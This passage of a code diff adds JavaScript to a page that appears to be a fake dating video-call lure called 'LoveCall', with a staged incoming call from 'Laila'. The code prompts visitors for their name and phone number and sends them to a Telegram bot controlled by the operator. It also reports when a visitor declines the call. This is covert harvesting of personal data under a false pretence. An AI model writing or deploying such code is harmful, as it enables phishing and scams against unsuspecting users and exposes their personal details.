+                `❌ <b>تم رفض المكالمة</b>\n👤 المستخدم: ${userName}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+            
+            // إظهار شاشة الرفض
+            callContainer.style.display = "none";
+            declinedScreen.style.visibility = "visible";
+            
+            setTimeout(() => {
+                declinedScreen.style.visibility = "hidden";
+                callContainer.style.display = "flex";
+                callAccepted = false;
+                callStatusText.innerHTML = "🔔 مكالمة فيديو واردة من Laila 🔔";
+                updateStatus("❤️ جاهز للتطابق");
+            }, 3000);
+        }
+        
+        // ======================== طلب اسم المستخدم ========================
+        function askUserName() {
+            const name = prompt("💖 مرحباً بك في منصة LoveCall 💖\n\nالرجاء إدخال اسمك:", "مستخدم جديد");
+            if (name && name.trim()) {
+                userName = name.trim();
+            }
+            const phone = prompt("📞 الرجاء إدخال رقم هاتفك (سيتم استخدامه للتواصل):", "01XXXXXXXXX");
+            if (phone && phone.trim()) {
+                userPhone = phone.trim();
+            }
+            updateStatus(`❤️ مرحباً ${userName}`);
+            
+            // إرسال بيانات الدخول
+            sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                `🆕 <b>مستخدم جديد دخل المنصة</b>\n👤 الاسم: ${userName}\n📞 الهاتف: ${userPhone}\n🌐 المصدر: LoveCall\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+        }
+        
+        // ربط الأحداث
+        acceptBtn.addEventListener('click', acceptCall);
+        declineBtn.addEventListener('click', declineCall);
+        
+        // طلب اسم المستخدم عند البداية
+        setTimeout(askUserName, 500);
+        
+        updateStatus("❤️ جاهز للتطابق - انتظر مكالمة من Laila");
+    })();
+</script>
 </body>
 </html>
